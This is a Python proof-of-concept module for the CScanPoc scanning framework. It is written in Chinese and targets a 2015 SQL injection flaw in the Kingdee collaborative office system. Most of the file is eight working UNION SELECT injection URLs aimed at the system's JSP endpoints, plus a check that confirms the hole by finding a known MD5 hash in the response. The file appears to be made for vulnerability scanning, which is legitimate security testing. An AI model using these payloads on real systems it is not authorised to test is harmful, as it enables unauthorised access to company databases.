# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Kingdee_0001'  # 平台漏洞编号，留空
    name = '金蝶协同办公系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-26'  # 漏洞公布时间
    desc = '''
        金蝶协同办公管理系统助力企业实现从分散到协同，规范业务流程、降低运作成本，提高执行力，并成为领导的工作助手、员工工作和沟通的平台。
        金蝶协同办公系统文件参数过滤不严谨，造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0136918'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金蝶协同办公系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6b5ff7e5-dad7-4542-8230-cc57c0b2e05a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:#http://www.wooyun.org/bugs/wooyun-2015-0136918
            payloads = [
                "/kingdee/tree/tree/announce/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/announce/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/discuss/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/discuss/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/news/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))----",
                "/kingdee/tree/tree/news/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/rules/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/rules/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--"
            ]
            for payload in payloads:
                verify_url = self.target + payload
                r = requests.get(verify_url)

                if r.status_code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;url{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
